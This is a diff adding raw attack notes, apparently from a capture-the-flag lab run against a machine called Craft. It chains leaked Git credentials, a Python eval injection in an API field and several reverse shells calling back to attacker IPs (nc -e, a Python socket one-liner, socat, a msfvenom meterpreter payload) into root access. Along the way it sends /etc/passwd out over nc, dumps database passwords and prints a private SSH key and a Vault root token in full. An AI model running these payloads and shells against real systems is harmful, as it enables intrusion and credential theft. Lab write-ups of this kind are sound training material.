@@ -1,0 +1,682 @@
+
+echo -n | openssl s_client -showcerts -connect gogs.craft.htb:443 2>/dev/null  | sed -ne '/-BEGIN CERTIFICATE-/,/-END CERTIFICATE-/p'
+git -c http.sslVerify=false clone https://gogs.craft.htb/Craft/craft-api.git
+ssh git@gogs.craft.htb
+
+Browse to https://gogs.craft.htb/Craft/craft-api/
+Explore > Users > Dinesh > Public Activity
+View comparison for these 2 commits »
+Under test/test.py in public activity of the gogs server, Dinesh has leaked credentials:
+https://gogs.craft.htb/Craft/craft-api/compare/4fd8dbf8422cbf28f8ec96af54f16891dfdd7b95...10e3ba4f0a09c778d7cec673f28d410b73455a86
+auth=('dinesh', '4aUh0A8PbVJxgd')
+
+use creds for the /auth/login endpoint at https://api.craft.htb/api
+
+Check the token works:
+curl -k -v -X GET "https://api.craft.htb/api/auth/check" -H  "accept: application/json" -H "X-Craft-API-Token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiZGluZXNoIiwiZXhwIjoxNTY4NjQzMTI1fQ.PVO92dxjhS_vhDpeQoDl-EHGIJ4HScsiag7iTbdisRU"
+
+curl -k -v -X POST "https://api.craft.htb/api/brew" -H  "accept: application/json" -H "X-Craft-API-Token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiZGluZXNoIiwiZXhwIjoxNTY4NjQzNzQ5fQ.i-WLRv_kRPbl6MszzMG_gLY8NB6-I-HI-RG_RYlXevk" -d "id=8888&brewer=reefer&name=keefer&style=lager&abv=1000"
+
+Route curl requests through burp proxy using --proxy like below:
+curl -k -v -X POST "https://api.craft.htb/api/brew" -H  "accept: application/json" -H "X-Craft-API-Token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiZGluZXNoIiwiZXhwIjoxNTY4NjQzNzQ5fQ.i-WLRv_kRPbl6MszzMG_gLY8NB6-I-HI-RG_RYlXevk" -d "id=19&brewer=reefer&name=keefer&style=lager&abv=1000" --proxy http://127.0.0.1:8080
+
+python3 gogsownz.py -k -v https://gogs.craft.htb -v -C 'dinesh:4aUh0A8PbVJxgd' --rce 'sleep 10'
+[i] Starting Gogsownz on: https://gogs.craft.htb
+[+] Loading Gogs homepage
+[@] Got CSRF Token i82cWve2Ddy2Mc00Tbosl3SpbB86MTU2ODY0NDY2MTM0NTQ5MDI5NA==
+[i] Gogs Version installed: © 2018 Gogs Version: 0.11.86.0130 
+[+] Performing login
+[@] Got CSRF Token hvJVB_D2j_O0qHCK8lhMO9iYh006MTU2ODY0NDY2MjAzNTYwODc3NA==
+[+] Logged in sucessfully as dinesh
+[@] Got CSRF Token hvJVB_D2j_O0qHCK8lhMO9iYh006MTU2ODY0NDY2MjAzNTYwODc3NA==
+[+] Got UserID 5
+[@] Got CSRF Token hvJVB_D2j_O0qHCK8lhMO9iYh006MTU2ODY0NDY2MjAzNTYwODc3NA==
+[+] Repository created sucessfully
+[i] Exploiting authenticated PrivEsc...
+[+] Uploading admin session as repository file
+Traceback (most recent call last):
+  File "gogsownz.py", line 428, in <module>
+    file, sess = g.upload_payload_repo(repo)
+  File "gogsownz.py", line 254, in upload_payload_repo
+    r = self.post_multipart('/{}/{}/upload-file'.format(self.username, repo_name), files, headers=headers)
+  File "gogsownz.py", line 154, in post_multipart
+    raise Exception("{}\n{}".format(req.status_code, req.text))
+Exception: 500
+NewUpload: malicious path detected: ../../../sessions/d/c/dc213cac8b001337
+
+
+python3 gogsownz.py -k -v https://gogs.craft.htb -v -C 'dinesh:4aUh0A8PbVJxgd' --preauth
+[i] Starting Gogsownz on: https://gogs.craft.htb
+[+] Loading Gogs homepage
+[@] Got CSRF Token SDnlN1Qk1p_nTzM-0MijmDaSyxE6MTU2ODY0NDg3MDMxNTk1OTIwOQ==
+[i] Gogs Version installed: © 2018 Gogs Version: 0.11.86.0130 
+[+] Performing login
+[@] Got CSRF Token Uv4X_gM0SPhavZGwTISLaTAiVO86MTU2ODY0NDg3MDgwNTUxNTMxNA==
+[+] Logged in sucessfully as dinesh
+[i] Exploiting pre-auth PrivEsc...
+[+] Uploading admin session as attachment file
+[@] Got CSRF Token Uv4X_gM0SPhavZGwTISLaTAiVO86MTU2ODY0NDg3MDgwNTUxNTMxNA==
+[+] Uploaded successfully, preparing cookies for the Path Traversal
+[+] Admin session hijacked, trying to login as admin
+Failed to upload session file. Probably the 'data/session/./.' folder doesn't esists
+
+
+
+Log into /user as dinesh. View ssh key:
+Workstation key
+SHA256:8Fc2kZiv0Y+kjkh8atKr6brzBiM1DoDIhG6LN1ktPfA
+Added on Feb 07, 2019 —
+Last used on Feb 07, 2019
+
+Install xclip
+sudo apt-get install xclip
+xclip -sel clip < ~/.ssh/id_rsa.pub
+
+Generate ssh key pair
+ssh-keygen -t rsa -b 2048 -C "dinesh@craft.htb"
+Enter a file in which to save the key (/home/you/.ssh/id_rsa): [Press enter]
+Enter passphrase (empty for no passphrase): [Type a passphrase]
+Enter same passphrase again: [Type passphrase again]
+
+
+dinesh / 4aUh0A8PbVJxgd
+ssh-keygen -t rsa -b 4096 -C "reefer@craft.htb"
+password: keefer
+ssh-add ~/.ssh/id_rsa
+
+
+
+https://gogs.craft.htb/Craft/craft-api/issues/2
+curl -H 'X-Craft-API-Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoidXNlciIsImV4cCI6MTU0OTM4NTI0Mn0.-wW1aJkLQDOE-GP5pQd3z_BJTe2Uo0jJ_mQ238P5Dqw' -H "Content-Type: application/json" -k -X POST https://api.craft.htb/api/brew/ --data '{"name":"bullshit","brewer":"bullshit", "style": "bullshit", "abv": "15.0")}'
+
+Remove unnecessary addiitonal closing parentheses at the end
+
+curl -H 'X-Craft-API-Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoidXNlciIsImV4cCI6MTU0OTM4NTI0Mn0.-wW1aJkLQDOE-GP5pQd3z_BJTe2Uo0jJ_mQ238P5Dqw' -H "Content-Type: application/json" -k -X POST https://api.craft.htb/api/brew/ --data '{"name":"bullshit","brewer":"bullshit", "style": "bullshit", "abv": "15.0"}'
+
+Renew token at https://gogs.craft.htb/user/settings/applications
+624a06658508a6b8a520ec8db2a5ba27df239c8c
+
+Substitute new token into curl request:
+curl -H 'X-Craft-API-Token: 624a06658508a6b8a520ec8db2a5ba27df239c8c' -H "Content-Type: application/json" -k -X POST https://api.craft.htb/api/brew/ --data '{"name":"bullshit","brewer":"bullshit", "style": "bullshit", "abv": "15.0"}'
+
+grep -rn ~/htb/boxes/craft/ -e "password" 
+
+Testing eval vulnerability locally on our machine:
+python
+>>> x = "__import__('os').system('id')"
+>>> eval('%s > 1' % x)
+uid=0(root) gid=0(root) groups=0(root)
+
+After issuing many POST request from the command line like this:
+curl -H 'X-Craft-API-Token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiZGluZXNoIiwiZXhwIjoxNTY4OTg1MTM5fQ.dXmu5hIhiYpAVhMOKYMb-W9-zoHEpI82-UMiCceK3Ek' -H "Content-Type: application/json" -k -X POST https://api.craft.htb/api/brew/ --data '{"name":"bs","brewer":"bs","style": "bs", "abv": '"__import__('os').system('id')"'}' --proxy http://127.0.0.1:8080
+
+Just kept getting the below error messages:
+bash: syntax error near unexpected token `)' 
+  --Surrounding the python in double quotes (") resolves the bash error but leads to:
+{"message": "The browser (or proxy) sent a request that this server could not understand."}
+  --And after sending the same request through Burp we get a server internal 500 error. 
+  
+  BUT, we in fact had command execution all along!! Issued a request containing a python command that would make a call back to local
+  web server just to verify if the command was actually getting executed despite the response codes and messages. And it was! Below request
+  will make a wget request back. So we have command execution.
+
+POST /api/brew/ HTTP/1.1
+
+Host: api.craft.htb
+
+User-Agent: curl/7.65.3
+
+Accept: */*
+
+X-Craft-API-Token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiZGluZXNoIiwiZXhwIjoxNTY4OTg2NTIzfQ.anPHPSvWRcCwryo7SdAapaoJDhx6XTWWayW0I8lo8Kw
+
+Content-Type: application/json
+
+Content-Length: 109
+
+Connection: close
+
+
+
+{"name":"bs","brewer":"bs","style": "bs", "abv": "__import__('os').system('wget 10.10.14.25:8000/test.txt')"}
+
+HTTP/1.1 400 BAD REQUEST
+
+Server: nginx/1.15.8
+
+Date: Fri, 20 Sep 2019 13:45:46 GMT
+
+Content-Type: application/json
+
+Content-Length: 44
+
+Connection: close
+
+
+
+"ABV must be a decimal value less than 1.0"
+
+NOTE!! When you proxy a request like the following through Burp:
+
+curl -H 'X-Craft-API-Token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiZGluZXNoIiwiZXhwIjoxNTY4OTg1MTM5fQ.dXmu5hIhiYpAVhMOKYMb-W9-zoHEpI82-UMiCceK3Ek' -H "Content-Type: application/json" -k -X POST https://api.craft.htb/api/brew/ --data '{"name":"bs","brewer":"bs","style": "bs", "abv": '"__import__('os').system('wget 10.10.14.25:8000/test.txt')"'}' --proxy http://127.0.0.1:8080
+
+It will strip the double-quotes (") and look like this:
+{"name":"bs","brewer":"bs","style": "bs", "abv": __import__('os').system('wget 10.10.14.25:8000/test.txt')}
+
+And the response will be:
+{"message": "The browser (or proxy) sent a request that this server could not understand."}
+
+Only once you add double quotes back in, will you successfully execute the command, and also get a response like this:
+HTTP/1.1 400 BAD REQUEST
+
+Server: nginx/1.15.8
+
+Date: Fri, 20 Sep 2019 13:45:46 GMT
+
+Content-Type: application/json
+
+Content-Length: 44
+
+Connection: close
+
+
+
+"ABV must be a decimal value less than 1.0"
+
+But despite the reponse we will see a GET request to our server.
+
+
+These to try and configre certifcate auth for ssh but never quite worked:
+{"name":"bs","brewer":"bs","style": "bs", "abv": "__import__('os').system('wget 10.10.14.25:8000/reefer.pub')"}
+{"name":"bs","brewer":"bs","style": "bs", "abv": "mkdir -p ~/.ssh && touch ~/.ssh/authorized_keys"}
+{"name":"bs","brewer":"bs","style": "bs", "abv": "chmod 700 ~/.ssh && chmod 600 ~/.ssh/authorized_keys"}
+{"name":"bs","brewer":"bs","style": "bs", "abv": "cp reefer.pub ~/.ssh/authorized_keys"}
+{"name":"bs","brewer":"bs","style": "bs", "abv": "__import__('os').system('wget 10.10.14.25:8000/nc')"}
+
+
+These worked for sure:
+nc -nlvp 4646 > passwd
+{"name":"bs","brewer":"bs","style": "bs", "abv": "__import__('os').system('nc 10.10.14.81 4646 < /etc/passwd')"}
+the root account is using /bin/ash (note, NOT bash or sh)
+{"name":"bs","brewer":"bs","style": "bs", "abv": "__import__('os').system('ls | nc 10.10.14.81 443')"}
+{"name":"bs","brewer":"bs","style": "bs", "abv": "__import__('os').system('nc -e /bin/sh 10.10.15.23 8989')"}
+{"name":"bs","brewer":"bs","style": "bs", "abv": "__import__('os').system('which ash | nc 10.10.14.81 443')"}
+/bin/ash
+
+--Getting our first shell--:
+nc -nlvp 443
+{"name":"bs","brewer":"bs","style": "bs", "abv": "__import__('os').system('nc 10.10.14.81 443 -e /bin/ash')"}
+
+We get a shell!!
+It's a weird shell but it returns as root. And the /home and /root directories are empty for some reason
+
+To spawn a better shell, set up another listener:
+nc -nlvp 8787
+
+Then run the following from the craft box
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.81",8787));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/ash","-i"]);'
+root@kali:~/htb/boxes/craft# nc -nlvp 8787
+listening on [any] 8787 ...
+connect to [10.10.14.81] from (UNKNOWN) [10.10.10.110] 57878
+/opt/app # 
+/opt/app # whoami
+root
+/root # id
+uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
+/root #
+
+Can't locate user.txt or root.txt for some reason though.
+/etc # uname -a
+Linux 5a3d243127f5 4.9.0-8-amd64 #1 SMP Debian 4.9.130-2 (2018-10-27) x86_64 Linux
+
+Modify the sql code in dbtest.py to:
+sql = "show tables"
+
+wget http://:8000/reefer.py
+chmod +x reefer.py
+/opt/app # ./reefer.py
+{'Tables_in_craft': 'brew'}
+/opt/app # 
+
+To get first shell:
+POST:
+
+POST /api/brew/ HTTP/1.1
+
+Host: api.craft.htb
+
+User-Agent: curl/7.65.3
+
+Accept: */*
+
+X-Craft-API-Token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiZGluZXNoIiwiZXhwIjoxNTY5NDE5NjkyfQ.KS_BBVIB7dl6QsDbNsDQ9zctBhrU18_pq67nVq8CVSEcd 
+
+Content-Type: application/json
+
+Content-Length: 111
+
+Connection: close
+
+
+
+{"name":"bs","brewer":"bs","style": "bs", "abv": "__import__('os').system('wget http://10.10.15.48:8000/nc')"}
+
+nc -nlvp 443
+Then POST:
+
+POST /api/brew/ HTTP/1.1
+
+Host: api.craft.htb
+
+User-Agent: curl/7.65.3
+
+Accept: */*
+
+X-Craft-API-Token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiZGluZXNoIiwiZXhwIjoxNTY5NDE5NjkyfQ.KS_BBVIB7dl6QsDbNsDQ9zctBhrU18_pq67nVq8CVSEcd 
+
+Content-Type: application/json
+
+Content-Length: 111
+
+Connection: close
+
+
+
+{"name":"bs","brewer":"bs","style": "bs", "abv": "__import__('os').system('nc 10.10.15.48 443 -e /bin/ash')"}
+
+
+NOTE: We need to spawn a /bin/ash shell. We know this from pulling the contents of /etc/passwd and seeing the default shell for the root user which is /bin/ash
+To get SECOND shell:
+nc -nlvp 8787
+Then run:
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.15.48",8787));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/ash","-i"]);'
+
+Running python interactively from the secon shell doesn't work
+vi also doesn't work
+
+in /opt/app/craft_api we find settings.py which contains the db connection info:
+
+# Flask settings
+FLASK_SERVER_NAME = 'api.craft.htb'
+FLASK_DEBUG = False  # Do not use debug mode in production
+
+# Flask-Restplus settings
+RESTPLUS_SWAGGER_UI_DOC_EXPANSION = 'list'
+RESTPLUS_VALIDATE = True
+RESTPLUS_MASK_SWAGGER = False
+RESTPLUS_ERROR_404_HELP = False
+CRAFT_API_SECRET = 'hz66OCkDtv8G6D'
+
+# database
+MYSQL_DATABASE_USER = 'craft'
+MYSQL_DATABASE_PASSWORD = 'qLGockJ6G2J75O'
+MYSQL_DATABASE_DB = 'craft'
+MYSQL_DATABASE_HOST = 'db'
+SQLALCHEMY_TRACK_MODIFICATIONS = False
+
+So the name of host hosting the database is ‘db’. Trying a ping to it, we see that it resolves to: 172.20.0.4
+
+/opt/app/craft_api # ping -c 1 db
+PING db (172.20.0.4): 56 data bytes
+64 bytes from 172.20.0.4: seq=0 ttl=64 time=0.216 ms
+
+Looks like we may need to pivot to that machine.
+ip route show | awk '/default/ {print $3}'
+
+/ # env
+HOSTNAME=5a3d243127f5
+PYTHON_PIP_VERSION=19.0.1
+SHLVL=5
+HOME=/root
+OLDPWD=/opt/app/craft_api
+GPG_KEY=0D96DF4D4110E5C43FBFB17F2D347EA6AA65421D
+PATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+LANG=C.UTF-8
+PYTHON_VERSION=3.6.8
+PWD=/
+
+
+To get Meterpreter shell:
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.15.48 LPORT=8989 -b "\x00" -e x86/shikata_ga_nai -f elf -o ./craftmet
+msfconsole
+use exploit/multi/handler
+set PAYLOAD linux/x86/meterpreter/reverse_tcp
+set LHOST 10.10.15.48
+set LPORT 9678
+exploit
+python -m SimpleHTTPServer 8000
+
+wget http://10.10.15.48:8000/craftmet
+chmod +x craftmet
+./craft met
+
+To establish a proxy chain to the internal network:
+Ctr+Z to background meterpreter session
+route add 172.20.0.6 255.255.255.0 1
+where 172.20.0.6 is the ip of craft
+1 is the meterpreter session id to craft
+use auxiliary/server/socks4a
+set SRVHOST 127.0.0.1
+exploit
+vi /etc/proxychains.conf
+Add the line:
+socks4  127.0.0.1 1080
+Comment out any other such lines or make it the top one because they will be enumerated in order from top to bottom
+Now when you run a command that you want to execute on the machine you just have to preface it with ‘proxychains’
+proxychains nc -nv 172.20.0.6 8888
+
+EXAMPLE:
+root@kali:~/htb/boxes/craft# proxychains nc -nv 172.20.0.6 8888
+ProxyChains-3.1 (http://proxychains.sf.net)
+|S-chain|-<>-127.0.0.1:1080-<><>-172.20.0.6:8888-<><>-OK
+(UNKNOWN) [172.20.0.6] 8888 (?) open : Operation now in progress
+dsgfdh
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
+        "http://www.w3.org/TR/html4/strict.dtd">
+<html>
+    <head>
+        <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
+        <title>Error response</title>
+    </head>
+    <body>
+        <h1>Error response</h1>
+        <p>Error code: 400</p>
+        <p>Message: Bad request syntax ('dsgfdh').</p>
+        <p>Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.</p>
+    </body>
+</html>
+root@kali:~/htb/boxes/craft# 
+
+root@kali:~/htb/boxes/craft# nc -nv 172.20.0.6 8888
+(UNKNOWN) [172.20.0.6] 8888 (?) : Connection refused
+
+
+So now we know there is some http service hosted on the loopback interface listening on port 8888
+
+Gain a fully interactive shell using socat
+socat file:`tty`,raw,echo=0 tcp-listen:7089
+wget -q http://10.10.15.48:8000/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'/bin/sh',pty,stderr,setsid,sigint,sane tcp:10.10.15.48:7089
+
+Can now run python commands interactively
+
+Create a python script to connect to db and execute sql queries:
+
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+import pymysql, sys
+connection = pymysql.connect(host='db', user='craft', password='qLGockJ6G2J75O' ,cursorclass=pymysql.cursors.DictCursor)
+cursor = connection.cursor()
+cmd = sys.argv[1]
+cursor.execute(cmd)
+print(cursor.fetchall())
+connection.close()
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+chmod +x reefer.py
+python reefer.py ‘<sql query>’
+
+/opt/app # python reefer.py 'show tables'
+[{'Tables_in_craft': 'brew'}, {'Tables_in_craft': 'user'}]
+
+/opt/app # python reefer.py 'select * from user'
+[{'id': 1, 'username': 'dinesh', 'password': '4aUh0A8PbVJxgd'}, {'id': 4, 'username': 'ebachman', 'password': 'llJ77D8QFkLPQB'}, {'id': 5, 'username': 'gilfoyle', 'password': 'ZEU3N8WNM2rh4T'}]
+
+
+CREDS FROM DB
+#####################
+dinesh : 4aUh0A8PbVJxgd
+ebachman : llJ77D8QFkLPQB
+gilfoyle : ZEU3N8WNM2rh4T
+#####################
+
+Gilfoyle's creds work to log into the git repo but not ebachman's
+Gilfoyle has his own repo craft-infra with all the config data here: 
+https://gogs.craft.htb/gilfoyle/craft-infra/commit/84736fb39dfa92d06910a130b9577a193ae608a9
+
+We find the ssh private key:
+-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABDD9Lalqe
+qF/F3X76qfIGkIAAAAEAAAAAEAAAEXAAAAB3NzaC1yc2EAAAADAQABAAABAQDSkCF7NV2Z
+F6z8bm8RaFegvW2v58stknmJK9oS54ZdUzH2jgD0bYauVqZ5DiURFxIwOcbVK+jB39uqrS
+zU0aDPlyNnUuUZh1Xdd6rcTDE3VU16roO918VJCN+tIEf33pu2VtShZXDrhGxpptcH/tfS
+RgV86HoLpQ0sojfGyIn+4sCg2EEXYng2JYxD+C1o4jnBbpiedGuqeDSmpunWA82vwWX4xx
+lLNZ/ZNgCQTlvPMgFbxCAdCTyHzyE7KI+0Zj7qFUeRhEgUN7RMmb3JKEnaqptW4tqNYmVw
+pmMxHTQYXn5RN49YJQlaFOZtkEndaSeLz2dEA96EpS5OJl0jzUThAAAD0JwMkipfNFbsLQ
+B4TyyZ/M/uERDtndIOKO+nTxR1+eQkudpQ/ZVTBgDJb/z3M2uLomCEmnfylc6fGURidrZi
+4u+fwUG0Sbp9CWa8fdvU1foSkwPx3oP5YzS4S+m/w8GPCfNQcyCaKMHZVfVsys9+mLJMAq
+Rz5HY6owSmyB7BJrRq0h1pywue64taF/FP4sThxknJuAE+8BXDaEgjEZ+5RA5Cp4fLobyZ
+3MtOdhGiPxFvnMoWwJLtqmu4hbNvnI0c4m9fcmCO8XJXFYz3o21Jt+FbNtjfnrIwlOLN6K
+Uu/17IL1vTlnXpRzPHieS5eEPWFPJmGDQ7eP+gs/PiRofbPPDWhSSLt8BWQ0dzS8jKhGmV
+ePeugsx/vjYPt9KVNAN0XQEA4tF8yoijS7M8HAR97UQHX/qjbna2hKiQBgfCCy5GnTSnBU
+GfmVxnsgZAyPhWmJJe3pAIy+OCNwQDFo0vQ8kET1I0Q8DNyxEcwi0N2F5FAE0gmUdsO+J5
+0CxC7XoOzvtIMRibis/t/jxsck4wLumYkW7Hbzt1W0VHQA2fnI6t7HGeJ2LkQUce/MiY2F
+5TA8NFxd+RM2SotncL5mt2DNoB1eQYCYqb+fzD4mPPUEhsqYUzIl8r8XXdc5bpz2wtwPTE
+cVARG063kQlbEPaJnUPl8UG2oX9LCLU9ZgaoHVP7k6lmvK2Y9wwRwgRrCrfLREG56OrXS5
+elqzID2oz1oP1f+PJxeberaXsDGqAPYtPo4RHS0QAa7oybk6Y/ZcGih0ChrESAex7wRVnf
+CuSlT+bniz2Q8YVoWkPKnRHkQmPOVNYqToxIRejM7o3/y9Av91CwLsZu2XAqElTpY4TtZa
+hRDQnwuWSyl64tJTTxiycSzFdD7puSUK48FlwNOmzF/eROaSSh5oE4REnFdhZcE4TLpZTB
+a7RfsBrGxpp++Gq48o6meLtKsJQQeZlkLdXwj2gOfPtqG2M4gWNzQ4u2awRP5t9AhGJbNg
+MIxQ0KLO+nvwAzgxFPSFVYBGcWRR3oH6ZSf+iIzPR4lQw9OsKMLKQilpxC6nSVUPoopU0W
+Uhn1zhbr+5w5eWcGXfna3QQe3zEHuF3LA5s0W+Ql3nLDpg0oNxnK7nDj2I6T7/qCzYTZnS
+Z3a9/84eLlb+EeQ9tfRhMCfypM7f7fyzH7FpF2ztY+j/1mjCbrWiax1iXjCkyhJuaX5BRW
+I2mtcTYb1RbYd9dDe8eE1X+C/7SLRub3qdqt1B0AgyVG/jPZYf/spUKlu91HFktKxTCmHz
+6YvpJhnN2SfJC/QftzqZK2MndJrmQ=
+-----END OPENSSH PRIVATE KEY-----
+
+And public key:
+
++ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDSkCF7NV2ZF6z8bm8RaFegvW2v58stknmJK9oS54ZdUzH2jgD0bYauVqZ5DiURFxIwOcbVK+jB39uqrSzU0aDPlyNnUuUZh1Xdd6rcTDE3VU16roO918VJCN+tIEf33pu2VtShZXDrhGxpptcH/tfSRgV86HoLpQ0sojfGyIn+4sCg2EEXYng2JYxD+C1o4jnBbpiedGuqeDSmpunWA82vwWX4xxlLNZ/ZNgCQTlvPMgFbxCAdCTyHzyE7KI+0Zj7qFUeRhEgUN7RMmb3JKEnaqptW4tqNYmVwpmMxHTQYXn5RN49YJQlaFOZtkEndaSeLz2dEA96EpS5OJl0jzUTh gilfoyle@craft.htb
+
+VAULT CREDS:
+
+vault / 91A6E7F85D05C65630BEF18951852D87348FFC4C
+8200/tcp is the primary interface that applications use to interact with
+
+
+#!/bin/bash
+# set up vault secrets backend
+vault secrets enable ssh
+vault write ssh/roles/root_otp \
+    key_type=otp \
+    default_user=root \
+    cidr_list=0.0.0.0/0
+
+
+create files:
+id_rsa.pub
+id_rsa
+
+To land shell as gilfoyle:
+With the contents of the public key and private key, respectively, to ~/.ssh
+chmod +600 id_rsa
+ssh-add id_rsa
+Use gilfoyle's password: ZEU3N8WNM2rh4T
+ssh -T gilfoyle@craft.htb
+
+cat user.txt
+bbf4b0cadfa3d4e6d0914c9cd5a612d4
+
+
+hkp://p80.pool.sks-keyservers.net:80
+hkp://keyserver.ubuntu.com:80
+hkp://pgp.mit.edu:80
+gpg --keyserver "hkp://p80.pool.sks-keyservers.net:80" --recv-keys "91A6E7F85D05C65630BEF18951852D87348FFC4C"
+
+git -c http.sslVerify=false clone https://gogs.craft.htb/gilfoyle/craft-infra
+gilfoyle
+ZEU3N8WNM2rh4T
+
+
+## Vault vhost ##
+    server {
+        listen       443 ssl ;
+        server_name  vault.craft.htb;
+        ssl_certificate /etc/nginx/pki/vault.craft.htb.crt;
+        ssl_certificate_key /etc/nginx/pki/vault.craft.htb.key;
+
+cat /etc/hosts
+172.20.0.2 vault.craft.htb
+
+echo $VAULT_ADDR
+https://vault.craft.htb:8200/
+vault init
+WARNING! The "vault init" command is deprecated. Please use "vault operator
+init" instead. This command will be removed in Vault 1.1.
+
+Error initializing: Error making API request.
+
+URL: PUT https://vault.craft.htb:8200/v1/sys/init
+Code: 400. Errors:
+
+* Vault is already initialized
+
+vault secrets list
+vault init
+vault status
+vault read auth/token/lookup-self
+vault kv list secrets (gives us the uri path to secrets)
+vault kv list 
+vault token lookup f1783c8d-41c7-0b12-d1c1-cf2aa17ac6b9
+vault token capabilities f1783c8d-41c7-0b12-d1c1-cf2aa17ac6b9
+vault ssh localhost
+
+
+Key                 Value
+---                 -----
+accessor            1dd7b9a1-f0f1-f230-dc76-46970deb5103
+creation_time       1549678834
+creation_ttl        0s
+display_name        root
+entity_id           n/a
+expire_time         <nil>
+explicit_max_ttl    0s
+id                  f1783c8d-41c7-0b12-d1c1-cf2aa17ac6b9
+meta                <nil>
+num_uses            0
+orphan              true
+path                auth/token/root
+policies            [root]
+ttl                 0s
+
+gilfoyle@craft:~$ vault kv list secrets
+vault kv list secrets
+Error making API request.
+
+URL: GET https://vault.craft.htb:8200/v1/sys/internal/ui/mounts/secrets
+Code: 403. Errors:
+
+* Preflight capability check returned 403, please ensure client's policies grant access to path "secrets/"
+gilfoyle@craft:~$ 
+
+
+in /home/gilfoyle do:
+ls-latr
+-rw-r--r-- 1 gilfoyle gilfoyle   148 Feb  8  2019 .profile
+-rw------- 1 gilfoyle gilfoyle    36 Feb  9  2019 .vault-token
+drwx------ 3 gilfoyle gilfoyle  4096 Feb  9  2019 .config
+drwxr-xr-x 3 root     root      4096 Feb  9  2019 ..
+-rw------- 1 gilfoyle gilfoyle  2546 Feb  9  2019 .viminfo
+drwx------ 2 gilfoyle gilfoyle  4096 Feb  9  2019 .ssh
+-rw-r--r-- 1 gilfoyle gilfoyle   634 Feb  9  2019 .bashrc
+-r-------- 1 gilfoyle gilfoyle    33 Feb  9  2019 user.txt
+-rwxr-xr-x 1 gilfoyle gilfoyle 35520 Sep 20 10:14 nc
+drwx------ 4 gilfoyle gilfoyle  4096 Oct  6 11:35 .
+
+gilfoyle@craft:~$ cat .vault-token
+cat .vault-token
+f1783c8d-41c7-0b12-d1c1-cf2aa17ac6b9gilfoyle@craft:~$ 
+
+
+gilfoyle@craft:~$ vault token capabilities f1783c8d-41c7-0b12-d1c1-cf2aa17ac6b9
+<n capabilities f1783c8d-41c7-0b12-d1c1-cf2aa17ac6b9
+root
+gilfoyle@craft:~$ 
+
+vault login f1783c8d-41c7-0b12-d1c1-cf2aa17ac6b9
+WARNING! The VAULT_TOKEN environment variable is set! This takes precedence
+over the value set by this command. To use the value set by thisSuccess! You are now authenticated. The token information displayed below
+is already stored in the token helper. You do NOT need to run "vault login"
+again. Future Vault requests will automatically use this token.
+
+Key                  Value
+---                  -----
+token                f1783c8d-41c7-0b12-d1c1-cf2aa17ac6b9
+token_accessor       1dd7b9a1-f0f1-f230-dc76-46970deb5103
+token_duration       ∞
+token_renewable      false
+token_policies       ["root"]
+identity_policies    []
+policies             ["root"]
+ command,
+unset the VAULT_TOKEN environment variable or set it to the token displayed
+below.
+
+vault ssh -role ebachman localhost
+
+curl --header "X-Vault-Token: f1783c8d-41c7-0b12-d1c1-cf2aa17ac6b9" http://172.20.0.2:8200/v1/auth/userpass/users/root
+curl --header "X-Vault-Token: f1783c8d-41c7-0b12-d1c1-cf2aa17ac6b9" --request LIST http://172.20.0.2:8200/v1/auth/userpass/users/
+curl --header "X-Vault-Token: f1783c8d-41c7-0b12-d1c1-cf2aa17ac6b9" http://172.20.0.2:8200/v1/ssh/roles/root_otp
+curl --header "X-Vault-Token: f1783c8d-41c7-0b12-d1c1-cf2aa17ac6b9" --request LIST http://172.20.0.2:8200/v1/ssh/roles
+
+
+curl --header "X-Vault-Token: f1783c8d-41c7-0b12-d1c1-cf2aa17ac6b9" --request LIST -X GET http://172.20.0.2:8200/v1/auth/userpass/users/
+
+
+GETTING ROOT:
+-----------------------
+
+Have to spawn a tty shell other ssh command won't work since it's an interactive command.
+
+gilfoyle@craft:~$ ls -latr
+gilfoyle@craft:~$ cat .vault-token
+gilfoyle@craft:~$  vault login f1783c8d-41c7-0b12-d1c1-cf2aa17ac6b9
+gilfoyle@craft:~$ bash -i
+gilfoyle@craft:~$ python -c ‘import pty;pty.spawn("/bin/sh")’
+gilfoyle@craft:~$ vault ssh -mode=otp root@localhost
+vault ssh -mode=otp root@localhost
+WARNING: No -role specified. Use -role to tell Vault which ssh role to use for
+authentication. In the future, you will need to tell Vault which role to use.
